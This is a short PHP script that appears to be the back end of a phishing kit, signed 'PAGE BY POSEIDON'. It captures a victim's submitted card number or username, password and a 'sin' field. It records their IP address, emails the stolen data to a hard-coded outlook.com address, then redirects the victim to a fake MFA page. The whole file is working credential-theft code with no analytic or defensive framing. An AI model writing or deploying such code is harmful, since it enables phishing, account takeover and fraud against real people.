<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$cc = $_POST['cardNumberInputText'];
$pp = $_POST['passwordInputText'];
$data ="
=============PAGE BY POSEIDON===========
USER : $cc
pass : $pp
========================================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'ventura514@outlook.com';

mail($emailusr, $subj, $data);	

header("Location: ./mfaAuth.html");

?>